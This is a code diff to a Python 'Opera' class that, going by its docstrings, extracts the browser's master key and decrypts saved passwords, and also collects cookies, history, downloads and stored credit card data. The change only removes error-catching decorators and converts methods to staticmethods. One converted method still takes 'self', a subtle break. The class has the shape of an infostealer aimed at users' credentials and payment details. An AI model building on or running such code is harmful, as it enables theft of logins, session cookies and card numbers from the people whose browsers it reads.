@@ -36,7 +36,6 @@ class Opera:
         self.opera_history = []
         self.opera_banking = []
 
-    @catch
     def oget(self, func: callable, conv: bool=True) -> list:
         temp_data = []
 
@@ -53,12 +52,11 @@ class Opera:
 
         return temp_data
 
-    @catch
+    @staticmethod
     def get_encryption_key(self, path: str) -> bytes:
         """Retrieves the master encryption key used to encrypt the user's data
 
         Parameters:
-            self (object): The object passed to the method
             path (str): The browser path to get the encryption key from
 
         Returns:
@@ -81,12 +79,11 @@ class Opera:
 
         return master_key
 
-    @catch
-    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
+    @staticmethod
+    def decrypt_password(buff: bytes, master_key: bytes) -> str:
         """Decrypts an encrypted password using the given encryption key
 
         Parameters:
-            self (object): The object passed to the method
             password (str): The encrypted password to decrypt
             key (str): The master key to use for the decryption
 
@@ -102,7 +99,6 @@ class Opera:
 
         return decrypted_pass
 
-    @catch
     def _opera_passwords(self, path: str, conv: bool=True) -> list:
         """Retrieves the site url, username and password from the passed Opera browser by connecting to its database file -
            and decrypting the passwords using the encryption key
@@ -147,7 +143,6 @@ class Opera:
 
         return self.opera_passwords
 
-    @catch
     def _opera_cookies(self, path: str, conv: bool=True) -> list:
         """Retrieves the site host, cookie name, value and various other information from the passed Opera browser -
            by connecting to its database file and decrypting the cookies using the derived encryption key (from path)
@@ -195,7 +190,6 @@ class Opera:
 
         return self.opera_cookies
 
-    @catch
     def _opera_history(self, path: str, conv: bool=True) -> list:
         """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Opera browser -
            by connecting to its database file and parsing the needed data
@@ -239,7 +233,6 @@ class Opera:
 
         return self.opera_history
 
-    @catch
     def _opera_downloads(self, path: str, conv: bool=True) -> list:
         """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Opera browser -
            by connecting to its database file and parsing the needed data
@@ -281,7 +274,6 @@ class Opera:
 
         return self.opera_downloads
 
-    @catch
     def _opera_credit_cards(self, path: str, conv: bool=True) -> list:
         """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Opera browser -
            by connecting to its database file and parsing the needed data
